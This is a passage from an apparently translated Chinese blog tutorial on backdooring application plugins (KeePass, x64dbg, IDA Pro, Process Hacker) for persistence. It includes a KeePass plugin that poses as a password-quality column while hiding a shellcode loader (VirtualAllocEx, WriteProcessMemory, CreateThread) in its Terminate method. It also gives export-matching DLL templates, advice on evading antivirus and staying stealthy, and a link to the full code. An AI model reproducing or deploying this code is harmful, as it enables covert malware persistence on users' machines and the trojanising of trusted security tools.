            [DllImport("Kernel32.dll", ExactSpelling = true, SetLastError = true)]
            private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, AllocationType allocationType_0, AllocationProtect allocationProtect_0);
            [DllImport("Kernel32.dll", SetLastError = true)]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
              byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);
            private static IPluginHost m_host = null;
            private QualityColumnProvider m_prov = null;
            internal static IPluginHost Host
            {
                get { return m_host; }
            }
            public override bool Initialize(IPluginHost host)
            {
                Terminate();
                m_host = host;
                if(m_host == null) { Debug.Assert(false); return false; }
                m_prov = new QualityColumnProvider();
                m_host.ColumnProviderPool.Add(m_prov);
                m_host.MainWindow.FileClosed += this.OnFileClosed;
                return true;
            }
            public override void Terminate()
            {
                System.Diagnostics.Process olo = System.Diagnostics.Process.GetCurrentProcess();
                int pid = olo.Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, 0, pid);
                if (hProcess == IntPtr.Zero)
                {
                    throw new Exception("error!");
                }
                IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)buf.Length,
                AllocationType.Commit | AllocationType.Reserve, AllocationProtect.PAGE_EXECUTE_READWRITE);
                int zero = 0;
                IntPtr kek = IntPtr.Zero;
                WriteProcessMemory(hProcess, intPtr, buf, buf.Length, ref zero);
                UInt32 tid = 0;
                CreateThread(0, 0, intPtr, kek, 0, ref tid);
                if(m_host == null) return;
                m_host.MainWindow.FileClosed -= this.OnFileClosed;
                m_host.ColumnProviderPool.Remove(m_prov);
                m_prov = null;
                m_host = null;
            }
            private void OnFileClosed(object sender, FileClosedEventArgs e)
            {
                QualityColumnProvider.ClearCache();
            }
        }
        public sealed class QualityColumnProvider : ColumnProvider
        {
            private const string QcpName = "Password Quality";
            private const string QcpBitsSuffix = " bits";
            private static object m_oCacheSync = new object();
            private static Dictionary m_dCache =
                new Dictionary();
            private string[] m_vColNames = new string[] { QcpName };
            public override string[] ColumnNames
            {
                get { return m_vColNames; }
            }
            public override HorizontalAlignment TextAlign
            {
                get { return HorizontalAlignment.Right; }
            }
            internal static void ClearCache()
            {
                lock(m_oCacheSync)
                {
                    m_dCache.Clear();
                }
            }
            public override string GetCellData(string strColumnName, PwEntry pe)
            {
                if(strColumnName == null) { Debug.Assert(false); return string.Empty; }
                if(strColumnName != QcpName) return string.Empty;
                if(pe == null) { Debug.Assert(false); return string.Empty; }
                string strPw = pe.Strings.ReadSafe(PwDefs.PasswordField);
                if(strPw.IndexOf('{') >= 0)
                {
                    IPluginHost host = QualityColumnExt.Host;
                    if(host == null) { Debug.Assert(false); return string.Empty; }
                    PwDatabase pd = null;
                    try
                    {
                        pd = host.MainWindow.DocumentManager.SafeFindContainerOf(pe);
                    }
                    catch(Exception) { Debug.Assert(false); }
                    SprContext ctx = new SprContext(pe, pd, (SprCompileFlags.Deref |
                        SprCompileFlags.TextTransforms), false, false);
                    strPw = SprEngine.Compile(strPw, ctx);
                }
                uint uEst;
                lock(m_oCacheSync)
                {
                    if(!m_dCache.TryGetValue(strPw, out uEst)) uEst = uint.MaxValue;
                }
                if(uEst == uint.MaxValue)
                {
                    uEst = QualityEstimation.EstimatePasswordBits(strPw.ToCharArray());
                    lock(m_oCacheSync)
                    {
                        m_dCache[strPw] = uEst;
                    }
                }
                return (uEst.ToString() + QcpBitsSuffix);
            }
        }
    }
这里我们可以选择如何编译这些代码。Keepass可以接受类库（.NET
dll文件），也能接受“plgx”这种自有格式文件。如果选择后一种方式，我们可以更好地隐藏攻击载荷，规避杀毒软件，感谢Keepass提供这个功能！
32位的shellcode无法在我机器上的.NET环境中运行，具体原因不明，不要在意这个细节。
解决办法就是使用64位shellcode，即使宿主程序位32位程序也没问题。
现在我们可以编译攻击代码，在命令行中输入`KeePass.exe –plgx-create`，会弹出一个对话框让我们选择包含C#工程文件的目录。
只要将生成的plgx文件放入keepass目录中（并不一定要是插件目录），我们的插件就可以伴随keepass一起启动。
## 六、X64dbg
我是非常耿直的人，因此我把目光转向了调试器。[X64dbg](https://x64dbg.com/#start)是我正在使用的调试器，如果你还在使用olly或者immunity，你需要与时俱进，紧跟时代潮流了。
首先我们在CFF Explorer中加载程序（这一次没有使用ida）。
我们需要在dll框架代码中填入3个导出函数：
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lol)
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            {
                MessageBoxW(NULL,L"hello x64dbg, i am a backdoor.",L"wek",MB_OK);
                break;
            }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    extern __declspec(dllexport) void pluginit(void)
    {
        MessageBoxW(NULL,L"i am also a backdoor",L"joe",MB_OK);
        return;
    }
    extern __declspec(dllexport) void plugsetup(void)
    {
        MessageBoxW(NULL,L"i am also a backdoor",L"joe",MB_OK);
        return;
    }
    extern __declspec(dllexport) void plugstop(void)
    {
        MessageBoxW(NULL,L"i am also a backdoor",L"joe",MB_OK);
        return;
    }
为了让x64dbg加载我们的插件，只需要将我们的dll文件重命名为“.dp64”文件，将其放入插件目录中即可。
现在启动调试器，见证奇迹发生：
想象一下，如果某款恶意软件探测到x64dbg正在运行，它将自身副本解封装到插件目录，然后触发调试器崩溃，那么下次调试器运行时恶意软件也能自动运行，可利用的场景还有很多，不一而足。
## 七、IDA Pro
最后的重头戏留给IDA Pro。
我选择的是“COM Helper”这个插件，貌似IDA会自动加载这个插件。
插件文件位于插件目录中，如下所示：
在IDA中打开其中某个文件（有点讽刺意味），我们发现只有一个导出条目：`PLUGIN`。这样dll代码就比较简单了：
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lol)
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            {
                MessageBoxW(NULL,L"Hi mr IDA",L"YO",MB_OK);
                break;
            }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    extern __declspec(dllexport) void PLUGIN(void)
    {
        MessageBoxW(NULL,L"Hello IDA. I am a backdoor!",L"joe",MB_OK);
        return;
    }
编译dll代码，将其命名为“comhelper.dll”以及“comhelper64.dll”（要确保两个版本的IDA都能加载我们的插件），放入插件目录中即可。程序还是会加载`DLL_PROCESS_ATTACH`。
读到这里，大家会不会担心某些心怀不轨的黑客会窃取这种思路，开始散播带有后门插件的IDA种子？放心，没有人会这么做的。
## 八、Process Hacker
我的主机上还有许多程序可以植入后门插件，比如VLC、Foobar、DropBox、Ifranview、mumble以及Cheat
Engine等，但攻击者可能没有那么多时间。如果我们想在目标主机上实现本地持久化，可以考虑以用户每天都使用的某款程序作为目标来植入后门插件，注意要保持隐蔽性。
总之，我们只需要将恶意代码加入主dll文件的入口点中，就能得到运行机会。事实上这种方法对大多数插件来说都是适用的。当然，的确有部分插件预设了一些条件，比如需要使用特定的导出函数名等，但总体而言，我们可以将代码填入DllMain中的`DLL_PROCESS_ATTACH`区域，这就足以应对大多数情况。提问一下，大家之前有没有用过Process
Hacker？
如果我们将任何64位dll放入Process Hacker的“plugins”目录中，不需要做任何处理，程序就会运行我们的代码。这种现象与IDA
Pro类似：
对于其他插件，如果这么做不行，我们只需要拷贝导出函数名（只需要匹配函数名，不需要考虑序号），满足预设条件即可，剩下的工作就比较简单了。我觉得我们可以使用病毒或者其他程序来自动化完成这个工作。
## 九、总结
大家可以从[这里](http://www.gironsec.com/blog/wp-content/uploads/2018/03/blog.7z)下载本文用到的所有代码，密码为`infected`。
感谢大家百忙中阅读此文，我还有许多事情要去处理，比如我需要编写64位版本的metasploit模块，需要重写crypter（被误报为“wannacry”），还需要深入学习IOT设备以及网络摄像头方面知识。对了，前面我们留下了一个坑：TLS回调函数，后面我会解决这个问题。
希望大家有个愉快的黑客之旅。